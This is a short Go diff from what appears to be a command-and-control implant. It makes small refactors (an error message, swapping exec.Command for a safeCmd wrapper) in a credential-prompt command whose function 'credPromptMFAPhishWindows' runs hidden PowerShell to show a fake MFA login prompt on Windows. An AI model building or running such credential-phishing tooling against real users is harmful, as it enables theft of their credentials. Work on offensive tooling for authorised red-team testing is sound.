@@ -5,7 +5,6 @@ package commands
 import (
 	"encoding/json"
 	"fmt"
-	"os/exec"
 	"os/user"
 	"strings"
 	"syscall"
@@ -65,7 +64,7 @@ func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResu
 
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return errorf("Error parsing parameters: %v", err)
+			return errorf("parsing parameters: %v", err)
 		}
 	}
 
@@ -228,7 +227,7 @@ func credPromptMFAPhishWindows(task structs.Task) structs.CommandResult {
 		strings.ReplaceAll(title, "'", "''"),
 	)
 
-	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", psScript)
+	cmd := safeCmd("powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", psScript)
 	out, err := cmd.CombinedOutput()
 	defer structs.ZeroBytes(out)
 	if err != nil {
